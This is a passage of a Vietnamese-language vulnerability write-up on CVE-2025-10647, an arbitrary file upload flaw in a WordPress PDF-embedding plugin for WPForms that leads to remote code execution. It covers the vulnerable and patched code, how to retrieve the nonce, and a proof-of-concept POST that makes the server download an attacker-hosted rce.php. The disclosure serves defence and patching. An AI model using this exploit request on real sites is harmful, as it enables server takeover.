</span></span><span class="line"><span class="cl">                <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;The download failed&#39;</span><span class="p">,</span> <span class="s1">&#39;embed-pdf-wpforms&#39;</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Download the file.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$tmp_file</span> <span class="o">=</span> <span class="nx">download_url</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$tmp_file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wp_send_json_error</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="cm">/* translators: 1. An error message. */</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nx">sprintf</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;The download failed with error &#34;%s&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;embed-pdf-wpforms&#39;</span> <span class="p">),</span> <span class="nv">$tmp_file</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">()</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Move from a temp file to the uploads directory.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$upload_dir</span> <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_name</span>  <span class="o">=</span> <span class="nx">wp_unique_filename</span><span class="p">(</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$path</span>       <span class="o">=</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$wp_filesystem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">class_exists</span><span class="p">(</span> <span class="s1">&#39;WP_Filesystem&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">require_once</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;/wp-admin/includes/file.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">WP_Filesystem</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">move</span><span class="p">(</span> <span class="nv">$tmp_file</span><span class="p">,</span> <span class="nv">$path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Bản vá đã:</p>
<ul>
<li>Thực hiện kiểm tra quyền người dùng:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;upload_files&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">...</span> <span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Chỉ cho phép user có quyền upload mới được gọi handler.</p>
<ul>
<li>Chỉ chấp nhận một số loại file được tải lên</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">wp_check_filetype</span><span class="p">(</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">)[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">wp_send_json_error</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;The download failed&#39;</span><span class="p">,</span> <span class="s1">&#39;embed-pdf-wpforms&#39;</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><a href="https://developer.wordpress.org/reference/functions/wp_check_filetype/"target="_blank" rel="external nofollow noopener noreferrer"><code>wp_check_filetype()</code></a> thuộc WP Core trả về 2 key chính:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ext&#39;</span>  <span class="o">=&gt;</span> <span class="nx">string</span><span class="o">|</span><span class="k">false</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="nx">string</span><span class="o">|</span><span class="k">false</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu <code>type</code> không thuộc <a href="https://developer.wordpress.org/reference/functions/wp_get_mime_types/"target="_blank" rel="external nofollow noopener noreferrer"><code>wp_get_mime_types()</code></a> thì trả về false. Mặc định chỉ chấp nhận các file không thực thi được (Không chấp nhận <code>php</code>).</p>
<h3 class="heading-element" id="vulnerable-code"><span>Vulnerable Code</span>
  <a href="#vulnerable-code" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Hàm <code>ajax_handler_download_pdf_media()</code>:</p>
<ol>
<li>Check <code>nonce</code> chống CSRF</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">check_ajax_referer</span><span class="p">(</span> <span class="s1">&#39;epdf_wf_download_pdf_media&#39;</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Khi tìm kiếm với từ khóa <code>epdf_wf_download_pdf_media</code> trong thư mục chứa mã nguồn của plugin</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-06-cve-2025-10647/nonce_create.png" title="Nonce được tạo với key `_ajax_nonce`" data-thumbnail="/posts/2025-11-06-cve-2025-10647/nonce_create.png" data-sub-html="<h2>Nonce Create</h2><p>Nonce được tạo với key `_ajax_nonce`</p>"><img loading="lazy" src='/posts/2025-11-06-cve-2025-10647/nonce_create.png' alt="Nonce Create" height="390" width="1591"></a><figcaption class="image-caption">Nonce được tạo với key `_ajax_nonce`</figcaption>
  </figure></p>
<p>Nonce được tạo có key là <code>_ajax_nonce</code> được lưu trữ bởi Object <code>epdf_wf_pdf_viewer_strings</code> =&gt; có thể lấy giá trị của <code>_ajax_nonce</code> trong console của trình duyệt bằng cách gọi <code>epdf_wf_pdf_viewer_strings.nonce</code></p>
<p><figure><a class="lightgallery" href="/posts/2025-11-06-cve-2025-10647/get_nonce.png" title="Lấy nonce từ console trình duyệt" data-thumbnail="/posts/2025-11-06-cve-2025-10647/get_nonce.png" data-sub-html="<h2>Get Nonce</h2><p>Lấy nonce từ console trình duyệt</p>"><img loading="lazy" src='/posts/2025-11-06-cve-2025-10647/get_nonce.png' alt="Get Nonce" height="728" width="1097"></a><figcaption class="image-caption">Lấy nonce từ console trình duyệt</figcaption>
  </figure></p>
<p>Nonce này được tạo sau khi truy cập trang được tạo bằng <strong>WPForms</strong> sử dụng <strong>PDF Viewer</strong></p>
<p><figure><a class="lightgallery" href="/posts/2025-11-06-cve-2025-10647/create_form.png" title="Tạo form bằng WPForms sử dụng PDF Viewer" data-thumbnail="/posts/2025-11-06-cve-2025-10647/create_form.png" data-sub-html="<h2>Create Form</h2><p>Tạo form bằng WPForms sử dụng PDF Viewer</p>"><img loading="lazy" src='/posts/2025-11-06-cve-2025-10647/create_form.png' alt="Create Form" height="728" width="1097"></a><figcaption class="image-caption">Tạo form bằng WPForms sử dụng PDF Viewer</figcaption>
  </figure></p>
<p>Form được tạo sẽ embed vào Post/Page của WordPress</p>
<ol start="2">
<li>Kiểm tra dữ liệu gửi lên</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">wp_send_json_error</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu request không có url, hàm sẽ trả về JSON lỗi và dừng thực thi.</p>
<ol start="3">
<li>Lấy và làm sạch URL</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="nx">esc_url_raw</span><span class="p">(</span> <span class="nx">wp_unslash</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>wp_unslash()</code> loại bỏ slash escape (WordPress tự thêm escape khi gửi POST).</li>
<li><code>esc_url_raw()</code> làm sạch URL để đảm bảo an toàn trước khi dùng để tải file.</li>
</ul>
<ol start="4">
<li>Tải file về server (temporary)</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$tmp_file</span> <span class="o">=</span> <span class="nx">download_url</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>download_url()</code> tải file từ URL về file tạm thời trên server.</li>
<li>Trả về đường dẫn tới file tạm nếu thành công, hoặc <code>WP_Error</code> nếu thất bại.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$tmp_file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">wp_send_json_error</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nx">sprintf</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;The download failed with error &#34;%s&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;embed-pdf-wpforms&#39;</span> <span class="p">),</span> <span class="nv">$tmp_file</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">()</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Nếu download thất bại → trả về JSON lỗi kèm thông báo lỗi.</li>
</ul>
<ol start="5">
<li>Xác định thư mục upload và tên file</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$upload_dir</span> <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$file_name</span>  <span class="o">=</span> <span class="nx">wp_unique_filename</span><span class="p">(</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span>       <span class="o">=</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>wp_upload_dir()</code> trả về mảng thông tin thư mục uploads: path, URL, subdir, …</li>
<li><code>wp_unique_filename()</code> đảm bảo tên file không trùng với các file đã có.</li>
<li><code>$path</code> là đường dẫn đầy đủ nơi file sẽ được lưu.</li>
<li><code>$upload_dir['path']</code> thường có dạng là <code>wp-content/uploads/year/month</code></li>
</ul>
<ol start="6">
<li>Khởi tạo hệ thống Filesystem của WordPress</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">global</span> <span class="nv">$wp_filesystem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">class_exists</span><span class="p">(</span> <span class="s1">&#39;WP_Filesystem&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">require_once</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;/wp-admin/includes/file.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">WP_Filesystem</span><span class="p">();</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="7">
<li>Di chuyển file tạm sang thư mục uploads</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">move</span><span class="p">(</span> <span class="nv">$tmp_file</span><span class="p">,</span> <span class="nv">$path</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Di chuyển file từ <code>temp ($tmp_file)</code> sang <code>uploads ($path)</code>.</li>
<li>Sử dụng <code>$wp_filesystem-&gt;move()</code> thay vì <code>rename()</code> để tương thích mọi môi trường (<code>Direct</code>, <code>FTP</code>, <code>…</code>).</li>
</ul>
<hr>
<p><code>ajax_handler_download_pdf_media()</code> được dăng ký làm callback cho action hook</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">add_action</span><span class="p">(</span> <span class="s1">&#39;wp_ajax_epdf_wf_download_pdf_media&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;ajax_handler_download_pdf_media&#39;</span> <span class="p">)</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Điều này có nghĩa là:</p>
<ul>
<li><code>wp_ajax_</code> yêu cầu người dùng đã đăng nhập(tối thiếu là <code>Subcriber</code>) mới được gửi request đươc chấp nhận</li>
<li><code>epdf_wf_download_pdf_media</code> là action được truyền trong param</li>
</ul>
<p>Khi người dùng đã đăng nhập gửi request đến endpoint <code>/wp-admin/admin-ajax.php</code> với param <code>action=epdf_wf_download_pdf_media</code> thì <code>ajax_handler_download_pdf_media()</code> được gọi để xử lý request</p>
<h3 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="diagram-container">
  <pre class="mermaid">
graph TD
A["Subcriber POST -> /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media&url=..."] --> B["ajax_handler_download_pdf_media()"]
B --> C["check_ajax_referer('epdf_wf_download_pdf_media')"]
C --> D["download_url($url) -> $tmp_file (temporary file)"]
D --> E{"is_wp_error($tmp_file) ?"}
E -- "yes" --> F["wp_send_json_error() -> STOP"]
E -- "no" -->  K["Uploaded file accessible → potential RCE"]
</pre>
  <pre class="mermaid-dark">
graph TD
A["Subcriber POST -> /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media&url=..."] --> B["ajax_handler_download_pdf_media()"]
B --> C["check_ajax_referer('epdf_wf_download_pdf_media')"]
C --> D["download_url($url) -> $tmp_file (temporary file)"]
D --> E{"is_wp_error($tmp_file) ?"}
E -- "yes" --> F["wp_send_json_error() -> STOP"]
E -- "no" -->  K["Uploaded file accessible → potential RCE"]
</pre>
  <pre class="mermaid-neutral">
graph TD
A["Subcriber POST -> /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media&url=..."] --> B["ajax_handler_download_pdf_media()"]
B --> C["check_ajax_referer('epdf_wf_download_pdf_media')"]
C --> D["download_url($url) -> $tmp_file (temporary file)"]
D --> E{"is_wp_error($tmp_file) ?"}
E -- "yes" --> F["wp_send_json_error() -> STOP"]
E -- "no" -->  K["Uploaded file accessible → potential RCE"]
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph TD
A["Subcriber POST -> /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media&url=..."] --> B["ajax_handler_download_pdf_media()"]
B --> C["check_ajax_referer('epdf_wf_download_pdf_media')"]
C --> D["download_url($url) -> $tmp_file (temporary file)"]
D --> E{"is_wp_error($tmp_file) ?"}
E -- "yes" --> F["wp_send_json_error() -> STOP"]
E -- "no" -->  K["Uploaded file accessible → potential RCE"]
</pre></template>
</div>
<h2 class="heading-element" id="exploit"><span>Exploit</span>
  <a href="#exploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ol>
<li>Truy cập trang chứa form được tạo từ <strong>WPForms</strong> sử dụng <strong>PDF Viewer</strong></li>
<li>Lấy nonce</li>
<li>Tạo file <code>.php</code> chứa code RCE và lưu trữ trên internet</li>
<li>Gửi POST request với url trỏ đến file vừa tạo.</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-admin/admin-ajax.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; wp-settings-time-5=1761992371</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">_ajax_nonce=ea2ccf0ccd&amp;action=epdf_wf_download_pdf_media&amp;url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="5">
<li>Truy cập file vừa tạo và RCE</li>
</ol>
<p><figure><a class="lightgallery" href="/posts/2025-11-06-cve-2025-10647/result.png" title="RCE với file upload" data-thumbnail="/posts/2025-11-06-cve-2025-10647/result.png" data-sub-html="<h2>Result</h2><p>RCE với file upload</p>"><img loading="lazy" src='/posts/2025-11-06-cve-2025-10647/result.png' alt="Result" height="619" width="1145"></a><figcaption class="image-caption">RCE với file upload</figcaption>
  </figure></p>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng cho phép <strong>arbitrary file upload</strong> trong <code>ajax_handler_download_pdf_media()</code> là do thiếu kiểm tra quyền và kiểu file khi tải file từ URL, dẫn đến khả năng kẻ tấn công có tài khoản Subscriber tải lên file thực thi (ví dụ <code>.php</code>) và gây <strong>RCE</strong>. Nhà phát triển đã khắc phục bằng cách kiểm tra <code>current_user_can('upload_files')</code> và xác thực MIME với <code>wp_check_filetype()</code> trong phiên bản <strong>1.1.6</strong>. Đối với site bị ảnh hưởng, cần cập nhật lên 1.1.6 ngay, kiểm tra và xoá các file khả nghi trong thư mục uploads, rà soát quyền người dùng và nhật ký để phát hiện dấu hiệu khai thác.</p>
